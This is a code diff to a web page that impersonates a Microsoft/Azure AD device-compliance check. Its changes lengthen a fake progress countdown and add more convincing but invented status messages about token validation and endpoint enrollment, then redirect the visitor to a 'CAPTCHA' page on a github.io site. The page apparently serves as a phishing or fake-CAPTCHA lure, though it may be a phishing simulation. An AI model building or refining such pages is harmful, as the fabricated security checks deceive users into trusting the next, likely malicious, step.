@@ -147,7 +147,7 @@ h1 {
   background: #0078d4;
   width: 0%;
   border-radius: 2px;
-  transition: width 2s linear;
+  transition: width 7s linear;
 }
 .info-row {
   display: flex;
@@ -250,10 +250,13 @@ h1 {
 
   // Status messages cycle while "checking"
   var messages = [
-    { text: "Verifying device compliance\u2026",   detail: "Checking endpoint security policies" },
-    { text: "Validating session token\u2026",       detail: "Confirming identity with Azure AD" },
-    { text: "Loading security module\u2026",        detail: "Preparing additional verification step" }
-  ];
+    { text: "Verifying device compliance\u2026",     detail: "Checking endpoint security policies" },
+    { text: "Contacting Azure AD\u2026",             detail: "Confirming identity with directory services" },
+    { text: "Validating session token\u2026",        detail: "Cross-referencing device certificate" },
+    { text: "Checking MDE enrollment\u2026",         detail: "Confirming endpoint is managed" },
+    { text: "Loading security module\u2026",         detail: "Preparing additional verification step" },
+    { text: "Almost done\u2026",                     detail: "Finalising compliance check" }
+];
   var idx = 0;
 
   // Start progress bar immediately
@@ -269,7 +272,7 @@ h1 {
   }, 700);
 
   // Countdown timer
-  var secs = 2;
+  var secs = 7;
   var countInterval = setInterval(function() {
     secs--;
     document.getElementById('timer').textContent = secs;
@@ -285,7 +288,7 @@ h1 {
     document.getElementById('countdown').style.display = 'none';
     // Redirect to CAPTCHA page
     window.location.href = 'https://tameerhussain-ai.github.io/IT-Compliance/verify.html';
-  }, 2000);
+  }, 7000);
 </script>
 
 </body>
